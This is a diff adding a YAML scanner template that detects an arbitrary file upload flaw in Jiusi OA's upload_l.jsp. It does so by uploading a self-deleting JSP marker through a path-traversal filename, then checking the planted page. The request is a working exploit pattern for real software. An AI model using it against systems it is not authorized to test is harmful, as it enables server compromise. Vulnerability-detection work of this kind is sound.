@@ -1,0 +1,20 @@
+name: 九思OA-upload_l.jsp-任意文件上传
+description: >-
+  文件上传
+alwaysExecute: false
+matchCount: 2
+rules:
+  - method: POST
+    path: /jsoa/wpsforlinux/src/upload_l.jsp?openType=1&flowflag=1&userName=1&recordId=1
+    headers:
+      filename: /../../tologin.jsp
+    body: >
+      <%out.println(Rscan_test);new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+    expression:
+      status: 200
+  - method: GET
+    path: /jsoa/tologin.jsp    
+    expression:
+      status: 200
+      body_all:
+        - "Rscan_test"
